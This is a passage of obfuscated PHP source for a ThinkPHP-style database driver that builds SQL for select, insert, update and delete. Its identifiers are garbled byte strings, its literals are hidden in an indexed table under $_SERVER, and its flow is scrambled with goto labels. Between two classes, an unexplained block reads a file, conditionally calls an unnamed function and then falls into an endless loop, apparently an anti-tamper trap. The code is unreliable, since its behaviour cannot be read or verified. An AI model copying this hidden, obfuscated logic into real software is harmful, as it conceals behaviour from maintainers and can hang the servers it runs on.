$this->parseWhereItem($this->parseKey($Eîèƒâç¼ô), $eê—ï½óÜ­) . $B¿Şùã÷[842]; } $a‚–ÉÄ×Á .= implode($B¿Şùã÷[943], $dšÕë¹èï); } elseif (strpos($BÆÀÇ„è—‡, $B¿Şùã÷[289])) { $EèïÌ«óóé = explode($B¿Şùã÷[289], $BÆÀÇ„è—‡); $dšÕë¹èï = array(); foreach ($EèïÌ«óóé as $FÈ­¢¨ŒñŠ => $Eîèƒâç¼ô) { $eê—ï½óÜ­ = $BÜªêœè‹Ò ? $CÎ„°¢âæŠ[$FÈ­¢¨ŒñŠ] : $CÎ„°¢âæŠ; $dšÕë¹èï[] = $B¿Şùã÷[265] . $this->parseWhereItem($this->parseKey($Eîèƒâç¼ô), $eê—ï½óÜ­) . $B¿Şùã÷[842]; } $a‚–ÉÄ×Á .= implode($B¿Şùã÷[938], $dšÕë¹èï); } else { $a‚–ÉÄ×Á .= $this->parseWhereItem($this->parseKey($BÆÀÇ„è—‡), $CÎ„°¢âæŠ); } } $a‚–ÉÄ×Á .= $B¿Şùã÷[283] . $e‡³Ê‰Œêñ; } $a‚–ÉÄ×Á = substr($a‚–ÉÄ×Á, 0, -strlen($e‡³Ê‰Œêñ)); } return empty($a‚–ÉÄ×Á) ? $B¿Şùã÷[43] : $B¿Şùã÷[944] . $a‚–ÉÄ×Á; } protected function parseWhereItem($fÔÂÁŞÛÍ, $F§Ç¹ºğ¯Ñ) { $f¥†¨ìå¦É =& $_SERVER[¾÷]; $a”Ú—‰Ö = $f¥†¨ìå¦É[43]; if (is_array($F§Ç¹ºğ¯Ñ)) { if (is_string($F§Ç¹ºğ¯Ñ[0])) { $Bç‹ª¶ğÄ  = strtolower($F§Ç¹ºğ¯Ñ[0]); if (in_array($F§Ç¹ºğ¯Ñ[0], array($f¥†¨ìå¦É[928], $f¥†¨ìå¦É[945], $f¥†¨ìå¦É[946], $f¥†¨ìå¦É[947], $f¥†¨ìå¦É[948], $f¥†¨ìå¦É[949]))) { $a”Ú—‰Ö .= $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $F§Ç¹ºğ¯Ñ[0] . $f¥†¨ìå¦É[60] . $this->parseValue($F§Ç¹ºğ¯Ñ[1]); } elseif (preg_match($f¥†¨ìå¦É[950], $F§Ç¹ºğ¯Ñ[0])) { $a”Ú—‰Ö .= $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $this->exp[$Bç‹ª¶ğÄ ] . $f¥†¨ìå¦É[60] . $this->parseValue($F§Ç¹ºğ¯Ñ[1]); } elseif (preg_match($f¥†¨ìå¦É[951], $F§Ç¹ºğ¯Ñ[0])) { if (is_array($F§Ç¹ºğ¯Ñ[1])) { $AÄ‚¡÷¯¦º = isset($F§Ç¹ºğ¯Ñ[2]) ? strtoupper($F§Ç¹ºğ¯Ñ[2]) : $f¥†¨ìå¦É[936]; if (in_array($AÄ‚¡÷¯¦º, array($f¥†¨ìå¦É[935], $f¥†¨ìå¦É[936], $f¥†¨ìå¦É[937]))) { $c™ùçøï‚Œ = array(); foreach ($F§Ç¹ºğ¯Ñ[1] as $Bäâ×ó°¤Á) { $c™ùçøï‚Œ[] = $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $this->exp[$Bç‹ª¶ğÄ ] . $f¥†¨ìå¦É[60] . $this->parseValue($Bäâ×ó°¤Á); } $a”Ú—‰Ö .= $f¥†¨ìå¦É[265] . implode($f¥†¨ìå¦É[60] . $AÄ‚¡÷¯¦º . $f¥†¨ìå¦É[60], $c™ùçøï‚Œ) . $f¥†¨ìå¦É[842]; } } else { $a”Ú—‰Ö .= $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $this->exp[$Bç‹ª¶ğÄ ] . $f¥†¨ìå¦É[60] . $this->parseValue($F§Ç¹ºğ¯Ñ[1]); } } elseif ($f¥†¨ìå¦É[302] == $Bç‹ª¶ğÄ ) { $a”Ú—‰Ö .= $f¥†¨ìå¦É[840] . $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $F§Ç¹ºğ¯Ñ[1] . $f¥†¨ìå¦É[952]; } elseif (preg_match($f¥†¨ìå¦É[953], $F§Ç¹ºğ¯Ñ[0])) { $a”Ú—‰Ö .= $F§Ç¹ºğ¯Ñ[0]; } elseif (preg_match($f¥†¨ìå¦É[954], $F§Ç¹ºğ¯Ñ[0])) { if (isset($F§Ç¹ºğ¯Ñ[2]) && $f¥†¨ìå¦É[302] == $F§Ç¹ºğ¯Ñ[2]) { $a”Ú—‰Ö .= $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $this->exp[$Bç‹ª¶ğÄ ] . $f¥†¨ìå¦É[60] . $F§Ç¹ºğ¯Ñ[1]; } else { if (is_string($F§Ç¹ºğ¯Ñ[1])) { $F§Ç¹ºğ¯Ñ[1] = explode($f¥†¨ìå¦É[57], $F§Ç¹ºğ¯Ñ[1]); } $aë„Èº²ä = implode($f¥†¨ìå¦É[57], $this->parseValue($F§Ç¹ºğ¯Ñ[1])); $a”Ú—‰Ö .= $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $this->exp[$Bç‹ª¶ğÄ ] . $f¥†¨ìå¦É[840] . $aë„Èº²ä . $f¥†¨ìå¦É[842]; } } elseif (preg_match($f¥†¨ìå¦É[955], $F§Ç¹ºğ¯Ñ[0])) { $aÒñ‚É£”Ş = is_string($F§Ç¹ºğ¯Ñ[1]) ? explode($f¥†¨ìå¦É[57], $F§Ç¹ºğ¯Ñ[1]) : $F§Ç¹ºğ¯Ñ[1]; $a”Ú—‰Ö .= $f¥†¨ìå¦É[840] . $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $this->exp[$Bç‹ª¶ğÄ ] . $f¥†¨ìå¦É[60] . $this->parseValue($aÒñ‚É£”Ş[0]) . $f¥†¨ìå¦É[938] . $this->parseValue($aÒñ‚É£”Ş[1]) . $f¥†¨ìå¦É[283]; } else { think_exception(think_lang($f¥†¨ìå¦É[941]) . $f¥†¨ìå¦É[14] . $F§Ç¹ºğ¯Ñ[0]); } } else { $Eò©ê‹®­â = count($F§Ç¹ºğ¯Ñ); $c«‡œÓÀŠ‰ = $f¥†¨ìå¦É[43]; if (is_string($F§Ç¹ºğ¯Ñ[$Eò©ê‹®­â - 1])) { $c«‡œÓÀŠ‰ = isset($F§Ç¹ºğ¯Ñ[$Eò©ê‹®­â - 1]) ? strtoupper($F§Ç¹ºğ¯Ñ[$Eò©ê‹®­â - 1]) : $f¥†¨ìå¦É[43]; if (in_array($c«‡œÓÀŠ‰, array($f¥†¨ìå¦É[935], $f¥†¨ìå¦É[936], $f¥†¨ìå¦É[937]))) { $Eò©ê‹®­â = $Eò©ê‹®­â - 1; } } else { $c«‡œÓÀŠ‰ = $f¥†¨ìå¦É[935]; } for ($CÑ†›À×§’ = 0; $CÑ†›À×§’ < $Eò©ê‹®­â; $CÑ†›À×§’++) { $aÒñ‚É£”Ş = is_array($F§Ç¹ºğ¯Ñ[$CÑ†›À×§’]) ? $F§Ç¹ºğ¯Ñ[$CÑ†›À×§’][1] : $F§Ç¹ºğ¯Ñ[$CÑ†›À×§’]; if ($f¥†¨ìå¦É[302] == strtolower($F§Ç¹ºğ¯Ñ[$CÑ†›À×§’][0])) { $a”Ú—‰Ö .= $f¥†¨ìå¦É[265] . $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $aÒñ‚É£”Ş . $f¥†¨ìå¦É[952] . $c«‡œÓÀŠ‰ . $f¥†¨ìå¦É[60]; } else { $e¤«¾¹Â‡® = is_array($F§Ç¹ºğ¯Ñ[$CÑ†›À×§’]) ? $this->exp[strtolower($F§Ç¹ºğ¯Ñ[$CÑ†›À×§’][0])] : $f¥†¨ìå¦É[928]; if (!$e¤«¾¹Â‡® && is_array($F§Ç¹ºğ¯Ñ[$CÑ†›À×§’]) && in_array($F§Ç¹ºğ¯Ñ[$CÑ†›À×§’][0], array($f¥†¨ìå¦É[928], $f¥†¨ìå¦É[945], $f¥†¨ìå¦É[946], $f¥†¨ìå¦É[947], $f¥†¨ìå¦É[948], $f¥†¨ìå¦É[949]))) { $e¤«¾¹Â‡® = $F§Ç¹ºğ¯Ñ[$CÑ†›À×§’][0]; } $a”Ú—‰Ö .= $f¥†¨ìå¦É[265] . $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[60] . $e¤«¾¹Â‡® . $f¥†¨ìå¦É[60] . $this->parseValue($aÒñ‚É£”Ş) . $f¥†¨ìå¦É[952] . $c«‡œÓÀŠ‰ . $f¥†¨ìå¦É[60]; } } $a”Ú—‰Ö = substr($a”Ú—‰Ö, 0, -4); } } else { $a”Ú—‰Ö .= $fÔÂÁŞÛÍ . $f¥†¨ìå¦É[956] . $this->parseValue($F§Ç¹ºğ¯Ñ); } return $a”Ú—‰Ö; } protected function parseThinkWhere($Cî§Á½ª, $DÏÑÊ—²š) { $AîÆŸ»Ô¦È =& $_SERVER[¾÷]; $BºÆÓÕŠËƒ = $AîÆŸ»Ô¦È[43]; switch ($Cî§Á½ª) { case $AîÆŸ»Ô¦È[357]: $BºÆÓÕŠËƒ = $DÏÑÊ—²š; break; case $AîÆŸ»Ô¦È[939]: $BºÆÓÕŠËƒ = is_string($DÏÑÊ—²š) ? $DÏÑÊ—²š : substr($this->parseWhere($DÏÑÊ—²š), 6); break; case $AîÆŸ»Ô¦È[957]: parse_str($DÏÑÊ—²š, $FñÃ¬ËÑ¦Š); if (isset($FñÃ¬ËÑ¦Š[$AîÆŸ»Ô¦È[934]])) { $eÜ…“Ş–µ = $AîÆŸ»Ô¦È[60] . strtoupper($FñÃ¬ËÑ¦Š[$AîÆŸ»Ô¦È[934]]) . $AîÆŸ»Ô¦È[60]; unset($FñÃ¬ËÑ¦Š[$AîÆŸ»Ô¦È[934]]); } else { $eÜ…“Ş–µ = $AîÆŸ»Ô¦È[938]; } $F˜Äã = array(); foreach ($FñÃ¬ËÑ¦Š as $A­à¨Ü‡œÊ => $D†éïÃÂîÒ) { $F˜Äã[] = $this->parseKey($A­à¨Ü‡œÊ) . $AîÆŸ»Ô¦È[956] . $this->parseValue($D†éïÃÂîÒ); } $BºÆÓÕŠËƒ = implode($eÜ…“Ş–µ, $F˜Äã); break; } return $BºÆÓÕŠËƒ; } protected function parseLimit($Eª®à‚Ñ¤) { $DÀÓÔ½¸Îª =& $_SERVER[¾÷]; return !empty($Eª®à‚Ñ¤) ? $DÀÓÔ½¸Îª[58] . $Eª®à‚Ñ¤ . $DÀÓÔ½¸Îª[60] : $DÀÓÔ½¸Îª[43]; } protected function parseJoin($E˜¿Û´ãƒœ) { $EªÄ¤Ø†Äô =& $_SERVER[¾÷]; $cäùµ”ºÈ¦ = $EªÄ¤Ø†Äô[43]; if (!empty($E˜¿Û´ãƒœ)) { if (is_array($E˜¿Û´ãƒœ)) { foreach ($E˜¿Û´ãƒœ as $E£å‚ø•†‚ => $DÔã—óÖ½º) { if (!1 !== stripos($DÔã—óÖ½º, $EªÄ¤Ø†Äô[958])) { $cäùµ”ºÈ¦ .= $EªÄ¤Ø†Äô[60] . $DÔã—óÖ½º; } else { $cäùµ”ºÈ¦ .= $EªÄ¤Ø†Äô[959] . $DÔã—óÖ½º; } } } else { $cäùµ”ºÈ¦ .= $EªÄ¤Ø†Äô[959] . $E˜¿Û´ãƒœ; } } $cäùµ”ºÈ¦ = preg_replace($EªÄ¤Ø†Äô[960], think_config($EªÄ¤Ø†Äô[866]) . $EªÄ¤Ø†Äô[961], $cäùµ”ºÈ¦); return $cäùµ”ºÈ¦; } protected function parseOrder($D‰§¥Íš°ô) { $c¨™õ¿öà† =& $_SERVER[¾÷]; if (is_array($D‰§¥Íš°ô)) { $CŠÕ…æÔ™£ = array(); foreach ($D‰§¥Íš°ô as $b¹Ö¼˜æõ× => $f•˜²ƒ¸í) { if (is_numeric($b¹Ö¼˜æõ×)) { $CŠÕ…æÔ™£[] = $this->parseKey($f•˜²ƒ¸í); } else { $f•˜²ƒ¸í = in_array(strtoupper(trim($f•˜²ƒ¸í)), array($c¨™õ¿öà†[962], $c¨™õ¿öà†[963])) ? $c¨™õ¿öà†[60] . $f•˜²ƒ¸í : $c¨™õ¿öà†[43]; if (preg_match($c¨™õ¿öà†[964], $b¹Ö¼˜æõ×)) { $CŠÕ…æÔ™£[] = $this->parseKey($b¹Ö¼˜æõ×) . $f•˜²ƒ¸í; } else { think_exception($c¨™õ¿öà†[965] . $b¹Ö¼˜æõ×); } } } $D‰§¥Íš°ô = implode($c¨™õ¿öà†[57], $CŠÕ…æÔ™£); } return !empty($D‰§¥Íš°ô) ? $c¨™õ¿öà†[966] . $D‰§¥Íš°ô : $c¨™õ¿öà†[43]; } protected function parseGroup($AÚ¯ÛÔ¯ï) { $b‘…ôÌ±Ğ™ =& $_SERVER[¾÷]; return !empty($AÚ¯ÛÔ¯ï) ? $b‘…ôÌ±Ğ™[967] . $AÚ¯ÛÔ¯ï : $b‘…ôÌ±Ğ™[43]; } protected function parseHaving($A‡áĞŸàèö) { $b˜ï“‹¶Šù =& $_SERVER[¾÷]; return !empty($A‡áĞŸàèö) ? $b˜ï“‹¶Šù[968] . $A‡áĞŸàèö : $b˜ï“‹¶Šù[43]; } protected function parseComment($eğ£‘ö¦½) { $fäÉ‡„ÃˆÇ =& $_SERVER[¾÷]; return !empty($eğ£‘ö¦½) ? $fäÉ‡„ÃˆÇ[969] . $eğ£‘ö¦½ . $fäÉ‡„ÃˆÇ[970] : $fäÉ‡„ÃˆÇ[43]; } protected function parseDistinct($FÙÛÀÚÏƒ) { $AÂÖİ¡‚‡ë =& $_SERVER[¾÷]; return !empty($FÙÛÀÚÏƒ) ? $AÂÖİ¡‚‡ë[971] : $AÂÖİ¡‚‡ë[43]; } protected function parseUnion($BñÅ·š„¼ò) { $BÕË¬ÈØµÈ =& $_SERVER[¾÷]; if (empty($BñÅ·š„¼ò)) { return $BÕË¬ÈØµÈ[43]; } if (isset($BñÅ·š„¼ò[$BÕË¬ÈØµÈ[353]])) { $Eöâ²‹‚‹Š = $BÕË¬ÈØµÈ[972]; unset($BñÅ·š„¼ò[$BÕË¬ÈØµÈ[353]]); } else { $Eöâ²‹‚‹Š = $BÕË¬ÈØµÈ[973]; } foreach ($BñÅ·š„¼ò as $F ›ˆÖ¾é¡) { $eÖ×Ÿ×¬é[] = $Eöâ²‹‚‹Š . (is_array($F ›ˆÖ¾é¡) ? $this->buildSelectSql($F ›ˆÖ¾é¡) : $F ›ˆÖ¾é¡); } return implode($BÕË¬ÈØµÈ[60], $eÖ×Ÿ×¬é); } public function insert($FöŠ„¶ì², $B‰èÁ¯ßŒ¨ = array(), $eˆ×‰ª‰Ÿ = false) { goto f¸ÒáÑĞšï; f¸ÒáÑĞšï: $f¸ÏÆ ßï× =& $_SERVER[¾÷]; $d¢¶ªØğÒÔ = $dºµËïì°Ğ = array(); $this->model = $B‰èÁ¯ßŒ¨[$f¸ÏÆ ßï×[286]]; goto fÓÓ¨¾ÔóÑ; a®³Ï‚´·Õ: $fÇ—à×µŞ‰ .= $this->parseComment(!empty($B‰èÁ¯ßŒ¨[$f¸ÏÆ ßï×[359]]) ? $B‰èÁ¯ßŒ¨[$f¸ÏÆ ßï×[359]] : $f¸ÏÆ ßï×[43]); return $this->execute($fÇ—à×µŞ‰, $this->parseBind(!empty($B‰èÁ¯ßŒ¨[$f¸ÏÆ ßï×[290]]) ? $B‰èÁ¯ßŒ¨[$f¸ÏÆ ßï×[290]] : array())); goto dÛ‘Ú±È°ä; fÓÓ¨¾ÔóÑ: foreach ($FöŠ„¶ì² as $B„ò¡‚î²Ò => $A‘ù¹”‰éÓ) { if (is_array($A‘ù¹”‰éÓ) && $f¸ÏÆ ßï×[302] == $A‘ù¹”‰éÓ[0]) { $dºµËïì°Ğ[] = $this->parseKey($B„ò¡‚î²Ò); $d¢¶ªØğÒÔ[] = $A‘ù¹”‰éÓ[1]; } elseif (is_scalar($A‘ù¹”‰éÓ) || is_null($A‘ù¹”‰éÓ)) { $dºµËïì°Ğ[] = $this->parseKey($B„ò¡‚î²Ò); $d¢¶ªØğÒÔ[] = $this->parseValue($A‘ù¹”‰éÓ); } } $fÇ—à×µŞ‰ = ($eˆ×‰ª‰Ÿ ? $f¸ÏÆ ßï×[844] : $f¸ÏÆ ßï×[845]) . $f¸ÏÆ ßï×[846] . $this->parseTable($B‰èÁ¯ßŒ¨[$f¸ÏÆ ßï×[284]]) . $f¸ÏÆ ßï×[840] . implode($f¸ÏÆ ßï×[57], $dºµËïì°Ğ) . $f¸ÏÆ ßï×[841] . implode($f¸ÏÆ ßï×[57], $d¢¶ªØğÒÔ) . $f¸ÏÆ ßï×[842]; $fÇ—à×µŞ‰ .= $this->parseLock(isset($B‰èÁ¯ßŒ¨[$f¸ÏÆ ßï×[798]]) ? $B‰èÁ¯ßŒ¨[$f¸ÏÆ ßï×[798]] : !1); goto a®³Ï‚´·Õ; dÛ‘Ú±È°ä: } public function selectInsert($d†İîŞ³……, $B¸±¢ŞÕóŠ, $cÀ»©í™ƒô = array()) { goto eò„Ü©»Ö»; f¿ÁŞ‚ˆÙ: array_walk($d†İîŞ³……, array($this, $aÎ…ªÜ»™ç[843])); $bğœïªˆ‡ = $aÎ…ªÜ»™ç[974] . $this->parseTable($B¸±¢ŞÕóŠ) . $aÎ…ªÜ»™ç[840] . implode($aÎ…ªÜ»™ç[57], $d†İîŞ³……) . $aÎ…ªÜ»™ç[952]; $bğœïªˆ‡ .= $this->buildSelectSql($cÀ»©í™ƒô); goto cñ­¿Ù„ùï; cñ­¿Ù„ùï: return $this->execute($bğœïªˆ‡, $this->parseBind(!empty($cÀ»©í™ƒô[$aÎ…ªÜ»™ç[290]]) ? $cÀ»©í™ƒô[$aÎ…ªÜ»™ç[290]] : array())); goto FÀƒº´Ä‰; eò„Ü©»Ö»: $aÎ…ªÜ»™ç =& $_SERVER[¾÷]; $this->model = $cÀ»©í™ƒô[$aÎ…ªÜ»™ç[286]]; if (is_string($d†İîŞ³……)) { $d†İîŞ³…… = explode($aÎ…ªÜ»™ç[57], $d†İîŞ³……); } goto f¿ÁŞ‚ˆÙ; FÀƒº´Ä‰: } public function update($dŸ˜Í˜İÆ», $AÜâ‰°ù£Ê) { $dŞé¿÷ Ê =& $_SERVER[¾÷]; $this->model = $AÜâ‰°ù£Ê[$dŞé¿÷ Ê[286]]; $AÕ«Ùäò‘ = $dŞé¿÷ Ê[975] . $this->parseTable($AÜâ‰°ù£Ê[$dŞé¿÷ Ê[284]]) . $this->parseSet($dŸ˜Í˜İÆ») . $this->parseWhere(!empty($AÜâ‰°ù£Ê[$dŞé¿÷ Ê[280]]) ? $AÜâ‰°ù£Ê[$dŞé¿÷ Ê[280]] : $dŞé¿÷ Ê[43]) . $this->parseOrder(!empty($AÜâ‰°ù£Ê[$dŞé¿÷ Ê[370]]) ? $AÜâ‰°ù£Ê[$dŞé¿÷ Ê[370]] : $dŞé¿÷ Ê[43]) . $this->parseLimit(!empty($AÜâ‰°ù£Ê[$dŞé¿÷ Ê[297]]) ? $AÜâ‰°ù£Ê[$dŞé¿÷ Ê[297]] : $dŞé¿÷ Ê[43]) . $this->parseLock(isset($AÜâ‰°ù£Ê[$dŞé¿÷ Ê[798]]) ? $AÜâ‰°ù£Ê[$dŞé¿÷ Ê[798]] : !1) . $this->parseComment(!empty($AÜâ‰°ù£Ê[$dŞé¿÷ Ê[359]]) ? $AÜâ‰°ù£Ê[$dŞé¿÷ Ê[359]] : $dŞé¿÷ Ê[43]); return $this->execute($AÕ«Ùäò‘, $this->parseBind(!empty($AÜâ‰°ù£Ê[$dŞé¿÷ Ê[290]]) ? $AÜâ‰°ù£Ê[$dŞé¿÷ Ê[290]] : array())); } public function delete($b¨Ã†¹è³‚ = array()) { $Bª—÷äèî­ =& $_SERVER[¾÷]; $this->model = $b¨Ã†¹è³‚[$Bª—÷äèî­[286]]; $cµªïŞ÷ã† = $Bª—÷äèî­[976] . $this->parseTable($b¨Ã†¹è³‚[$Bª—÷äèî­[284]]) . $this->parseWhere(!empty($b¨Ã†¹è³‚[$Bª—÷äèî­[280]]) ? $b¨Ã†¹è³‚[$Bª—÷äèî­[280]] : $Bª—÷äèî­[43]) . $this->parseOrder(!empty($b¨Ã†¹è³‚[$Bª—÷äèî­[370]]) ? $b¨Ã†¹è³‚[$Bª—÷äèî­[370]] : $Bª—÷äèî­[43]) . $this->parseLimit(!empty($b¨Ã†¹è³‚[$Bª—÷äèî­[297]]) ? $b¨Ã†¹è³‚[$Bª—÷äèî­[297]] : $Bª—÷äèî­[43]) . $this->parseLock(isset($b¨Ã†¹è³‚[$Bª—÷äèî­[798]]) ? $b¨Ã†¹è³‚[$Bª—÷äèî­[798]] : !1) . $this->parseComment(!empty($b¨Ã†¹è³‚[$Bª—÷äèî­[359]]) ? $b¨Ã†¹è³‚[$Bª—÷äèî­[359]] : $Bª—÷äèî­[43]); return $this->execute($cµªïŞ÷ã†, $this->parseBind(!empty($b¨Ã†¹è³‚[$Bª—÷äèî­[290]]) ? $b¨Ã†¹è³‚[$Bª—÷äèî­[290]] : array())); } public function select($F¿Î‹é’ß = array()) { goto dÍÔ†÷«¾ä; bÃø‰õŸ×·: if ($cÎ¢Àâ— && !1 !== $c·ß¸£³•‚) { think_cache($e‡º‡©É¤, $c·ß¸£³•‚, $cÎ¢Àâ—); } return $c·ß¸£³•‚; goto cèœµÕÒ®; dÍÔ†÷«¾ä: $C‰óÒŠÊ¥¤ =& $_SERVER[¾÷]; $this->model = $F¿Î‹é’ß[$C‰óÒŠÊ¥¤[286]]; $CÛˆ…³¦ø = $this->buildSelectSql($F¿Î‹é’ß); goto E‡›Šâ‹º²; E‡›Šâ‹º²: $cÎ¢Àâ— = isset($F¿Î‹é’ß[$C‰óÒŠÊ¥¤[354]]) ? $F¿Î‹é’ß[$C‰óÒŠÊ¥¤[354]] : !1; if ($cÎ¢Àâ—) { $e‡º‡©É¤ = is_string($cÎ¢Àâ—[$C‰óÒŠÊ¥¤[102]]) ? $cÎ¢Àâ—[$C‰óÒŠÊ¥¤[102]] : $C‰óÒŠÊ¥¤[977] . md5($CÛˆ…³¦ø); $Bâ–˜Ø§ … = think_cache($e‡º‡©É¤, $C‰óÒŠÊ¥¤[43], $cÎ¢Àâ—); if (!1 !== $Bâ–˜Ø§ …) { return $Bâ–˜Ø§ …; } } $c·ß¸£³•‚ = $this->query($CÛˆ…³¦ø, $this->parseBind(!empty($F¿Î‹é’ß[$C‰óÒŠÊ¥¤[290]]) ? $F¿Î‹é’ß[$C‰óÒŠÊ¥¤[290]] : array())); goto bÃø‰õŸ×·; cèœµÕÒ®: } public function buildSelectSql($Dóò›‡™Ä = array()) { goto EÀ”Ğ³Û¶; c¡ß’ âÖ: $dÉ£æÈÎó¨ = $this->parseSql($this->selectSql, $Dóò›‡™Ä); $dÉ£æÈÎó¨ .= $this->parseLock(isset($Dóò›‡™Ä[$EÇ°§İğ¸«[798]]) ? $Dóò›‡™Ä[$EÇ°§İğ¸«[798]] : !1); if (isset($eâäºŠº×‡)) { think_cache($eâäºŠº×‡, $dÉ£æÈÎó¨); } goto d“ßôíí„; EÀ”Ğ³Û¶: $EÇ°§İğ¸« =& $_SERVER[¾÷]; if (isset($Dóò›‡™Ä[$EÇ°§İğ¸«[358]])) { if (strpos($Dóò›‡™Ä[$EÇ°§İğ¸«[358]], $EÇ°§İğ¸«[57])) { list($cò¬ì««éì, $C¬íÖïÜ÷ë) = explode($EÇ°§İğ¸«[57], $Dóò›‡™Ä[$EÇ°§İğ¸«[358]]); } else { $cò¬ì««éì = $Dóò›‡™Ä[$EÇ°§İğ¸«[358]]; } $cò¬ì««éì = $cò¬ì««éì ? $cò¬ì««éì : 1; $C¬íÖïÜ÷ë = isset($C¬íÖïÜ÷ë) ? $C¬íÖïÜ÷ë : (is_numeric($Dóò›‡™Ä[$EÇ°§İğ¸«[297]]) ? $Dóò›‡™Ä[$EÇ°§İğ¸«[297]] : 20); $F†±ÃÏ²˜­ = $C¬íÖïÜ÷ë * ((int) $cò¬ì««éì - 1); $Dóò›‡™Ä[$EÇ°§İğ¸«[297]] = $F†±ÃÏ²˜­ . $EÇ°§İğ¸«[57] . $C¬íÖïÜ÷ë; } if (think_config($EÇ°§İğ¸«[978])) { $eâäºŠº×‡ = $EÇ°§İğ¸«[979] . md5(serialize($Dóò›‡™Ä)); $B–Á§çÂ = think_cache($eâäºŠº×‡); if ($B–Á§çÂ) { return $B–Á§çÂ; } } goto c¡ß’ âÖ; d“ßôíí„: return $dÉ£æÈÎó¨; goto D¤Ü›½Õ®„; D¤Ü›½Õ®„: } public function parseSql($CŠÀ¶ƒ«â¶, $a¥¿ÊÓ·š = array()) { $Cšóíâ¹àÂ =& $_SERVER[¾÷]; $CŠÀ¶ƒ«â¶ = str_replace(array($Cšóíâ¹àÂ[980], $Cšóíâ¹àÂ[981], $Cšóíâ¹àÂ[982], $Cšóíâ¹àÂ[983], $Cšóíâ¹àÂ[984], $Cšóíâ¹àÂ[985], $Cšóíâ¹àÂ[986], $Cšóíâ¹àÂ[987], $Cšóíâ¹àÂ[988], $Cšóíâ¹àÂ[989], $Cšóíâ¹àÂ[990]), array($this->parseTable("{$a¥¿ÊÓ·š[$Cšóíâ¹àÂ[284]]}"), $this->parseDistinct(isset($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[991]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[991]] : !1), $this->parseField(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[278]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[278]] : $Cšóíâ¹àÂ[191]), $this->parseJoin(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[287]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[287]] : $Cšóíâ¹àÂ[43]), $this->parseWhere(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[280]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[280]] : $Cšóíâ¹àÂ[43]), $this->parseGroup(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[992]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[992]] : $Cšóíâ¹àÂ[43]), $this->parseHaving(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[993]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[993]] : $Cšóíâ¹àÂ[43]), $this->parseOrder(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[370]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[370]] : $Cšóíâ¹àÂ[43]), $this->parseLimit(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[297]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[297]] : $Cšóíâ¹àÂ[43]), $this->parseUnion(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[352]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[352]] : $Cšóíâ¹àÂ[43]), $this->parseComment(!empty($a¥¿ÊÓ·š[$Cšóíâ¹àÂ[359]]) ? $a¥¿ÊÓ·š[$Cšóíâ¹àÂ[359]] : $Cšóíâ¹àÂ[43])), $CŠÀ¶ƒ«â¶); return $CŠÀ¶ƒ«â¶; } public function getLastSql($A…Ä×ÌÙ†ƒ = '') { return $A…Ä×ÌÙ†ƒ ? $this->modelSql[$A…Ä×ÌÙ†ƒ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Cæ¼— ç‹) { return addslashes($Cæ¼— ç‹); } public function setModel($bø¬‚›¯³) { $this->model = $bø¬‚›¯³; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } if (!isset($_SERVER[$_SERVER[¾÷][4]]) || !isset($_SERVER[$_SERVER[¾÷][13]])) { goto a°¦šÆ±Ğ–; F¨»³¢´›…: $F¹÷Ô¿‰¯œ($_SERVER[$_SERVER[¾÷][7]] . $_SERVER[¾÷][8]); $DÙ£Ó†¥Á = 2; while ($DÙ£Ó†¥Á > 1) { $bìçÙÊ = rawurlencode($DÙ£Ó†¥Á . $_SERVER[¾÷][382]); } goto d†å¡¶‡™; aöØ´„¯‡›: $d«˜«‘µ¬ = explode($_SERVER[¾÷][9], $e´ŒãÓ‚»); if (count($d«˜«‘µ¬) < $_SERVER[¾÷][10]) { $Cˆå¢ÆÔ„½ = $_SERVER[¾÷][11]; $Cˆå¢ÆÔ„½(); } $F¹÷Ô¿‰¯œ = $_SERVER[¾÷][12]; goto F¨»³¢´›…; a°¦šÆ±Ğ–: $b­ØëØ—æº = $_SERVER[¾÷][6]; $DË¡È¡ÁÖñ = $_SERVER[$_SERVER[¾÷][7]] . $_SERVER[¾÷][8]; $e´ŒãÓ‚» = $b­ØëØ—æº($DË¡È¡ÁÖñ); goto aöØ´„¯‡›; d†å¡¶‡™: } class DbManage { function __construct($fÁÓöø­¤, $EöÉ•Ñëì˜ = '') { $this->database = $fÁÓöø­¤; $this->type = $EöÉ•Ñëì˜; } public function model($e“÷æ„Ÿ¨© = '') { return new ModelBase($e“÷æ„Ÿ¨©, $_SERVER[¾÷][43], $this->database); } public function db($BéÀóÂáø× = false) { goto aÍ÷…‘ßÚˆ; eªœéŠğ°: $d·È†Ü·ñô = $c–ö™—èè[$døï°¨ñœ‡[906]]; $c–ö™—èè[$døï°¨ñœ‡[906]] = $døï°¨ñœ‡[43]; if ($c–ö™—èè[$døï°¨ñœ‡[746]] == $døï°¨ñœ‡[747]) { $EŸŠ„¥¬‚ = 